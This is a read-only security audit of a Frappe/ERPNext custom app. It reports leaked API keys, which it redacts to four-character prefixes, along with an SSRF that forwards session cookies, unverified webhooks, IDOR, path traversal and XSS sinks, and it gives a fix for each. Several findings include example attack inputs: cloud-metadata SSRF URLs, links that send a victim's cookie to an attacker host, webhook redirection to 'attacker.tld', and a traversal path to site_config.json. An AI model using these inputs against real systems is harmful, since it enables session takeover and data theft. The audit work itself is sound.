# lh app: Jinja/templates, file uploads, hardcoded secrets (read-only audit)

Scope: `/home/frappe/frappe-bench/apps/lh` at HEAD `6f8c2ff6` (2026-10-23). Method: grep and read only. No bench, tests or project code were run. Frappe is v15.121.1. Framework behaviour that matters here:
- Frappe's Jinja env (`frappe/utils/jinja.py`) is a SandboxedEnvironment **without autoescape**, so every `{{ x }}` prints raw HTML, whether or not it has `|safe`.
- `BaseDocument._sanitize_content` bleach-sanitizes Data/Text fields on `insert()`/`save()`. `frappe.db.set_value`, `db_set` and raw SQL skip it.
- wkhtmltopdf runs with `disable-javascript` and `disable-local-file-access`.

Secret values are redacted to their first 4 characters followed by "…".

---

## CRITICAL / HIGH

### H1. 1Click API key in docs that are served publicly without login (current tree): **Critical if it is the live key, otherwise High**
- `lh/docs/oneclick_live_config_test_plan_2026-08-25.md:12`: `| api_key | zXTs… |` (46 chars)
- `lh/docs/oneclick_e2e_test_cases_2026-08-25.md:5`: "Uses the sandbox token already in Oneclick Settings (`zXTs…`, https://icomwms.dev)"
- Added in commits `8df6c4d1` and `1dff520f` (2026-08/09).
- Exposure: `sites/assets/lh_docs -> apps/lh/lh/docs` is a symlink, so `https://<site>/assets/lh_docs/oneclick_live_config_test_plan_2026-08-25.md` is readable by anyone. This is the same channel that commit 6f8c2ff6 closed for the Postman collection, but these two files were missed.
- Exploitation: an anonymous attacker fetches the file and calls the 1Click API (inventory, create orders, tracking) as Lyfe Hardware. The doc labels it a sandbox key (`icomwms.dev`), but the file title says "New Credentials" and the doc says "Configured in Oneclick Settings".
- Fix:
  1. Rotate the key with 1Click now.
  2. Remove the value from both docs.
  3. Purge it from git history (`git filter-repo`) or accept that it is burned.
  4. Stop publishing `lh/docs` as assets: move the docs out of `lh/docs`, or add an nginx deny for `/assets/lh_docs/`.
  5. Review the other 29 files in `lh/docs`, which hold internal test proofs, order IDs and plans.

### H2. 1Click credentials from the removed Postman collection are still in git history: **High**
- `lh/docs/oneclick_postman_collection.json` was added in `e69a1f25` (2026-08-17) and deleted in `6f8c2ff6`. History still holds:
  - `Token: GbOI…` (46 chars, ~line 442 of the deleted file)
  - `Token` / `X-Api-Key: Ak7M…` (46 chars, two places)
  - `X-Api-Key: OekL…` (32 chars)
- Until today the collection was also downloadable without login at `/assets/lh_docs/oneclick_postman_collection.json`, per the commit message.
- Exploitation: anyone with repo access (GitHub `lyfehardware/lh-erpnext`), or anyone who downloaded the asset before today, can use these keys.
- Fix: rotate all three with 1Click. Deleting the file does not revoke them. Scrub history if the repo will ever be shared.

### H3. Shopify Admin token and app client secret committed to git history: **High**
- `shpat_0217…` (Admin API access token) was hardcoded as `SHOPIFY_API_PASSWORD` in `lh/lyfe_hardware/doc_events/fetch_shopify_urls.py`. Added in `60b91113` (2026-03-04), removed in `aaf02843` (2026-03-06).
- `shpss_0bad…` (Shopify app client secret) was hardcoded in the token-rotation code and in `lh/patches/add_shopify_client_secret_field.py`. Added in `1568bb25` (2026-05-05). The code copy was removed in `5b39bdb6`; the patch copy stayed until `666b4165` ("update patch", 2026-10-23).
- Exploitation: the client secret plus the shop domain lets an attacker run the refresh-token grant (`/admin/oauth/access_token`) if they also hold a refresh token, and lets them forge Shopify webhook HMACs. `_verify_shopify_hmac` uses `custom_client_secret` as the signing key, so an attacker can forge `orders/paid` and `refunds/create` webhooks, which flips quotations to paid. The `shpat_` token gives full Admin API access unless it was rotated (token rotation every 45 min suggests the old static token may be dead; verify).
- Fix: rotate the client secret in the Shopify Partner/app settings and confirm the `shpat_0217…` token is revoked. Scrub history.

### H4. SSRF and session-cookie leak through the `CustomFile.get_content` override: **High**
- `lh/overrides/file.py:112-136`. For any `file_url` starting with `http(s)://` or `/api/`, the override does:
  ```python
  response = http_session.get(file_path)  # frappe.request has no such attr -> AttributeError
  ...
  session = frappe.local.session.sid
  full_url = frappe.utils.get_url(file_path)  # returns absolute URLs unchanged
  response = requests.get(full_url, cookies={"sid": session})
  ```
  `custom_is_safe_path` (`:151`) returns True for any `http(s)://` URL. There is no host allowlist, and redirects are followed.
- Reachability: Frappe's `/api/method/download_file?file_url=…` (`handler.py:287`, `allow_guest=True`) calls `file.get_content()` for any File the caller can read, and every **public** File is readable by everyone. Email attachments (`email_queue.py:419`), data import and similar paths also call `get_content()`.
- Exploitation:
  1. Any logged-in user creates `File{file_url:"http://169.254.169.254/latest/meta-data/iam/security-credentials/…", is_private:0}`, or points it at `http://127.0.0.1:<port>/…`, internal admin panels, or Redis-over-HTTP. They then call `download_file?file_url=<same>`. The server fetches the URL and returns the body: full-read SSRF, including cloud IAM credentials on AWS.
  2. The attacker creates a public File pointing at `https://attacker/x` and sends a staff member the link `https://<site>/api/method/download_file?file_url=https://attacker/x`. The server sends **the victim's `sid` cookie** to attacker.com, which is a session takeover (Administrator if the victim is admin).
- Fix:
  - For `http(s)` URLs, do not fetch in `get_content`. Defer to stock Frappe behaviour, which raises for remote files.
  - Never attach the session cookie to outbound requests.
  - If fetching remote content is needed, restrict to an allowlist of S3/CDN hosts and block private/link-local IPs.
  - Delete the generic `/api/` fallback.

### H5. Any logged-in user can redirect or delete Shopify webhooks (PII exfiltration): **High** (incidental, authorization)
- `lh/lyfe_hardware/integrations/shopify.py:239-240` `@frappe.whitelist() def register_shopify_webhooks(site_url=None)` and `:297-298` `deregister_shopify_webhooks()`. Neither has a role check.
- Exploitation: any desk or website user calls `register_shopify_webhooks(site_url="https://attacker.tld")`. Shopify then pushes every `orders/create`, `orders/paid` and `refunds/create` payload (customer names, emails, addresses, phone numbers, line items) to the attacker. `deregister_…` can silently break order intake.
- Fix: add `frappe.only_for("System Manager")` to both, and ignore or allowlist `site_url`.

---

## MEDIUM

### M1. Inbound webhooks skip verification when no secret is configured
- Shopify: `shopify.py:2412` `return  # secret not configured — skip verification` (used by the guest handlers at `:1560/1571/1583`).
- ShipStation: `integrations/shipstation_webhook.py:24`. It runs `if secret:` and otherwise accepts unsigned POSTs that create or update a **Lyfe Order** (`doc.insert(ignore_permissions=True)`). It also reads the secret from *Oneclick Settings*, not ShipStation Settings. ShipStation's v1 webhooks are not HMAC-signed, so this check is very likely disabled in production.
- 17Track: `doctype/lyfe_order/order_tracking_service.py:327` `if security_key:`.
- Exploitation: an unauthenticated attacker forges an order-paid or refund event, creates fake Lyfe Orders, or spoofs tracking statuses.
- Fix: reject the request when no secret is configured. Gorgias (`lh_project/gorgias/webhook.py:36-48`) and Slack (`slack/api.py:155`) already do this. For ShipStation, add a random URL token or restrict by source IP.

### M2. Quotation approval/tracking tokens: weak key derivation, hardcoded fallback, no expiry, guest-triggered email flood
- `lh/api.py:18`, `doc_events/quotation.py:2110` and `integrations/shopify.py:2521-2524` compute `secret = conf.secret_key or conf.db_password or "lh_approval_secret"`. `secret_key` is not a standard Frappe site_config key (Frappe uses `encryption_key`), so in practice the HMAC key is the **DB password**, and on a site without one it is the public literal `lh_approval_secret`.
- Tokens are deterministic `HMAC(secret, name)[:40]`. They never expire and cannot be revoked.
- `get_quotation_approval_url` and `get_quotation_tracking_url` are registered as global Jinja methods (`hooks.py:154-161`). Anyone who can author a Jinja template (Email Template, Print Format, Notification) can mint a valid approval link for any quotation and mark it **Won** (`approve_quotation`, guest).
- `track_quotation_link` (guest, `shopify.py:2458-2495`) sends the bank-transfer email on **every** click with no rate limit. Anyone holding one link can bomb the customer's inbox and the support mailbox, and the `ref` value is stored unvalidated.
- `track_email_open` (`quotation.py:2067`, guest) computes up to 500 HMACs per request, a cheap way to burn CPU.
- Fix:
  - Use a dedicated random secret (`frappe.conf.lh_link_secret`, or `encryption_key` with a domain prefix) and fail closed if it is missing.
  - Store a random per-quotation token (`frappe.generate_hash`) with an expiry.
  - Remove the approval helper from the global Jinja methods, or gate it.
  - Send the bank-transfer email once (or rate-limit it) and allowlist `ref`.

### M3. Task Automation Rule `safe_eval` receives the full `frappe` module
- `lh/lh_project/automation/rule_engine.py:409-414`. `frappe.safe_eval(condition, eval_globals={"doc":…, "frappe": frappe, …})`, where `condition` is the `trigger_condition` field of **Task Automation Rule** (Small Text, writable by System Manager).
- Exploitation: `frappe.db.sql("update `tabUser` …")`, `frappe.db.set_value(...)`, `frappe.sendmail(...)` and `frappe.get_doc(...).delete()` all pass `safe_eval`'s AST checks (no underscore attributes are needed). A System Manager, or anyone holding a stolen SM session, gets arbitrary DB read/write, including `__Auth` hashes, without Server Scripts being enabled. The code runs on every Task save by any user.
- Fix: pass a whitelisted read-only shim (`frappe.db.get_value`, `frappe.utils.*`), or remove the legacy Python condition path in favour of the structured `conditions` table.

### M4. `generate_pick_pack_pdf`: IDOR, SSRF, path traversal, private files copied to `public/`
- `lh/lyfe_hardware/doctype/lyfe_order/pick_pack.py:196-197` `@frappe.whitelist() generate_pick_pack_pdf(docname, use_temp_images, embed_images)` calls `frappe.get_doc("Lyfe Order", docname)` with **no permission check**. The PDF (customer name, email, phone, address) is attached and its URL returned, so any logged-in user can pull any order's PII.
- `save_image_to_temp` (`:32-104`):
  - Fetches arbitrary `image_url` values (from order lines, `extra_items`/`bom_items`, or Item.image) with `requests.get` (`:66`), which is blind SSRF.
  - Writes the response, under an attacker-chosen basename (for example `x.html`), into `<site>/public/files/tmp/<uuid>/`, so it is served from the site origin until cleanup.
  - Copies `/private/files/<basename>` into that **public** temp folder (`:91-94`).
- `to_data_uri` (`:121-148`): `img="/files/../../site_config.json"` resolves to `get_site_path("public","files/../../site_config.json")`, which is `<site>/site_config.json`, and the code reads it (`:138`). The impact is limited because the bytes only go into an `<img>` data URI in a server-side PDF, but it is still a traversal.
- Fix: `frappe.get_doc(...).check_permission("read")`. Only allow `/files/` or S3 keys, using `os.path.realpath` plus a commonpath check. Allowlist the hosts for remote images. Write temp images to a private, non-served directory or embed them as data URIs.

### M5. CustomFile allows a `/api/method/frappe_s3_attachment…?key=` `file_url`, which reads arbitrary S3 objects
- `lh/overrides/file.py:28` accepts this prefix. On insert, Frappe calls `self.save_file(content=self.get_content())`. `get_content` (`:92-101`) extracts `key=` and reads the object **directly with boto3** (`read_file_from_s3`), skipping any File permission check, then saves a copy owned by the caller.
- Exploitation: any user (role `All` has File create) who learns or obtains a private S3 key creates `File{file_url:"/api/method/frappe_s3_attachment.controller.generate_file?key=<key>"}` and downloads the copy. The third-party `generate_file` endpoint already hands out presigned URLs to any logged-in user, so the realistic gap is the same. Treat both as one weakness: **S3 keys behave like bearer tokens**, and keys are stored in `tabFile.content_hash`.
- Fix: in `get_content`, resolve the key to its originating File row and `check_permission("read")`. Override `generate_file` with a permission-checking wrapper (`override_whitelisted_methods`).

### M6. Sales Invoice PDFs stored as public files
- `lh/lyfe_hardware/doc_events/sales_invoice.py:182-188` `save_file(..., is_private=0)`, filename `{type}-Invoice-{name}.pdf`.
- Exploitation: public File rows are listable by every System User (`File.get_permission_query_conditions`: `is_private = 0`). Any desk user, including factory or limited roles, can list and download every customer's invoice. Without S3 the URL `/files/Tax-Invoice-<name>.pdf` is also predictable and guest-readable.
- Fix: `is_private=1`.

### M7. Unauthenticated trigger of a bulk carrier-tracking sync (incidental)
- `lh/lyfe_hardware/report/shipment_analysis_dashboard/shipment_analysis_dashboard.py:200-201` `@frappe.whitelist(allow_guest=True) update_all_real_time_tracking()` loops over up to 200 orders and calls `track_order`, which hits 17Track and the carrier APIs.
- Exploitation: a guest script burns the 17Track quota and causes DoS or API bans.
- Fix: remove `allow_guest` and require a role.

### M8. Slack incoming-webhook URL hardcoded in a patch (current tree)
- `lh/patches/add_us_warehouse_delivered_slack_webhook.py:3` `WEBHOOK_URL = "https://hooks.slack.com/services/T024…/B0C2…/BD26…"`.
- Exploitation: anyone with repo access can post arbitrary messages, including phishing, to that channel.
- Fix: revoke the webhook in Slack, set it through the UI or site_config, and remove the literal.

---

## LOW

### L1. Secret-bearing fields stored as `Data`, not `Password`
These are shown in clear on the form, in the REST API and in Version history to anyone with read on the settings doctype:
- `doctype/shipstation_settings/shipstation_settings.json:145` `ss_api_key` (half of the Basic-auth pair).
- Slack incoming-webhook URLs, which are bearer secrets:
  - `founder_briefing_settings.json` `slack_webhook_url`
  - `lh_slack_settings.json` `oneclick_slack_webhook_url`
  - `oneclick_settings.json` `us_warehouse_delivered_slack_webhook`
  - `lh_hrms/doctype/lh_hrms_settings/lh_hrms_settings.json`: `slack_webhook_url`, `daily_log_slack_webhook_url`, `founder_digest_slack_webhook_url`, `reconciliation_slack_webhook_url`, `points_digest_slack_webhook_url`, `reports_failure_alert_webhook_url`

The ShipStation and 17Track Slack URLs are already Password fields.
- Fix: change these to Password fields and read them with `get_password`.

### L2. Secrets written to Error Log
- `shopify.py:2429-2434`: the HMAC mismatch log records the **expected** signature for the attacker-supplied body. That turns Error Log access into a signing oracle for that body.
- `shopify_token_rotation.py:74`: `f"Unexpected response from Shopify: {data}"` logs the full token response, so if only one of access_token/refresh_token is returned, that token lands in Error Log.
- Fix: log only "mismatch" and redact token fields.

### L3. Print formats and templates render raw HTML (`|safe`, and Frappe has no autoescape anyway)
- Examples:
  - `print_format/sli/sli.html:131`
  - `sample_invoice/sample_invoice.html:64,73,125`
  - `packing_list/packing_list.html:31,32,92,101,158`
  - `lh_tax_invoice/lh_tax_invoice.html:27,76,85,130`
  - `commercial_invoice/commercial_invoice.html:59,68,123`
  - `zoho_purchase_order/zoho_purchase_order.html:70,83,85,276`
  - `templates/pdf/pick_pack_list.html:187`
  - `templates/pdf/pending_list.html:206`
  - `templates/print_formats/exporter_address.html:14`
  - The same templates are duplicated inside the `"html"` key of the print-format JSONs.
- Values are bleach-sanitized when docs are saved through the ORM, so exploitation needs a write path that skips sanitization (`frappe.db.set_value`/SQL from integrations, a Code field, or `ignore_xss_filter`). Browser print preview (`/printview`) is same-origin. PDFs are safe because JS and local-file access are disabled.
- Fix: explicitly `|e` user fields, then apply `replace("\n","<br>")` to the escaped value (`{{ (x|e)|replace("\n", "<br>"|safe) }}`, or a `nl2br` helper that escapes first).

### L4. Desk JS builds HTML from data fields without escaping
- `page/pnl_dashboard/pnl_dashboard.js:1095,1161-1162,1287,1688` (`r.customer`, `r.email`, also inside `title="…"` attributes)
- `page/quotation_analysis_dashboard/quotation_analysis_dashboard.js:812,1387-1389,1563,1685` (`customer_name`, `rule_name`)
- `page/returns_dashboard/returns_dashboard.js:355` (`row.customer`)
- `page/factory_quotation_dashboard/factory_quotation_dashboard.js:279` (`display_address`), `:775` (`c.content`, Comment HTML, sanitized on insert)
- `page/customer_intelligence_dashboard/customer_intelligence_dashboard.js:1529`
- `public/js/quotation.js:1480` (`address_classification`)

Same mitigation and residual risk as L3: customer and address data comes from Shopify/ShipStation. Other files in the codebase already use `frappe.utils.escape_html`.
- Fix: wrap these in `frappe.utils.escape_html`.

### L5. HTML email bodies built from unescaped doc fields
- `shopify.py:2578`: `f"<p>{customer_name} has selected bank transfer…"` to support@.
- `templates/emails/bank_transfer_followup.html:45` and `quotation_email.html:54` contain `Hi {{ customer_name }}`.
- 41 `frappe.sendmail` calls in total. Impact: HTML injection or phishing content in staff and customer emails.
- Fix: `frappe.utils.escape_html`.

### L6. Report export helpers let the caller choose `is_private` and the attach target
- `order_export_utils.py:273,653` and `lyfe_orders_status_overview_report.py:586,1775,2412` accept `is_private` (default 1, but the client can pass 0) plus `attach_doctype`/`attach_docname`.
- `overrides/file.py:205` `save_file` inserts with `ignore_permissions=True`, so a user can publish order-PII exports or attach files to documents they cannot write.
- Fix: force `is_private=1` and check write permission on the attach target.

### L7. Gorgias attachment download sends Basic-auth credentials to any URL in the payload
- `lh_project/gorgias/api_client.py:142` `requests.get(url, auth=_auth(settings))`. The URL comes from the webhook/API message.
- Fix: send credentials only when the host is `*.gorgias.com` or the configured domain.

### L8. Jinja helper `get_s3_image_url` reads any S3 key named in a field value
- `print_format/zoho_purchase_order/zoho_purchase_order.py:8-37`, registered globally (`hooks.py:159`), also `sales_invoice._get_s3_image_data_uri`.
- A user who can edit an image or attach field can embed any S3 image object into a print.
- Fix: resolve through a File row plus a permission check.

### L9. Misc
- `lh/overrides/s3_override.py:69`: the doc-event `custom_file_upload_to_s3(doc, method)` is decorated `@frappe.whitelist()`. Called over HTTP it crashes, but it should not be exposed. Remove the decorator.
- `drawing_upload.check_drawing_timesheet` (`drawing_upload.py:34`) creates Tasks (`ignore_permissions`) for any quotation name without a read check. `file_before_insert` only gates uploads that set `attached_to_field`, so the timesheet rule can be bypassed. This is business logic, not security.
- `cypress/cypress.config.js:21-23`: default creds `admin`/`test`. Fine for local use; make sure `CYPRESS_BASE_URL` is never production.
- `slack/api.py:142` `oauth_redirect` interpolates `error` into HTML. Today it 500s (no `route`), so it is not exploitable, but escape it.

---

## Checked, no issue
- `lh/www/bank-transfer-confirm.html` and `bank-transfer-instructions.html` are **static**: no `.py` context, no query-param lookup, no record data, so there is no enumeration or IDOR. The instructions page shows the company's receiving bank account and routing number to guests. That is by design; note the ACH-fraud exposure.
- Server-side template injection: every `frappe.render_template` call in lh uses a fixed path (`pick_pack.py:347`, `order_export_utils.py:873`, `lyfe_orders_status_overview_report.py:2689`). No `render_template` on user strings, no `eval`/`exec` on input, and no JS `frappe.render_template` on server data.
- Notifications: no Notification fixtures. `patches/update_quotation_notification_v2.py` only disables one.
- `drawing_upload.py` escapes the URL and filename in Task HTML (`escape_html`), and Frappe's `validate_file_url` blocks `javascript:` URLs.
- Gorgias attachments are saved private, with an extension blocklist and a size cap.
- Slack (fail-closed, timestamp check) and Gorgias webhook verification are sound.
- No `sk_`, `xoxb-`/`xoxp-` (only a doc placeholder), AWS or Google key patterns in the current tree. A git-history sweep for `key|secret|token|password = "<20+ chars>"` found only false positives beyond H2/H3.
- The CJ label, pick-pack, Gorgias and weekly stock report Files are `is_private=1`.

## Summary
Counts: Critical 0-1 (H1 is Critical if `zXTs…` is the live key), High 5 (H1-H5), Medium 8, Low 9 groups.

Top 5:
1. **H1**: 1Click API key `zXTs…` is still publicly served at `/assets/lh_docs/oneclick_live_config_test_plan_2026-08-25.md` and `oneclick_e2e_test_cases_2026-08-25.md`. Rotate it and stop serving `lh/docs`.
2. **H4**: `CustomFile.get_content` gives full-read SSRF via `download_file` and sends the victim's `sid` cookie to attacker URLs.
3. **H5**: `register_shopify_webhooks(site_url=…)` has no role check, so any user can redirect all Shopify order PII.
4. **H2/H3**: 1Click (`GbOI…`, `Ak7M…`, `OekL…`) and Shopify (`shpat_0217…`, `shpss_0bad…`) credentials are in git history. Rotate them.
5. **M1/M2**: Shopify, ShipStation and 17Track webhooks skip verification when no secret is set, and the quotation tokens use the DB password or a hardcoded fallback with no expiry and an email-bomb vector.
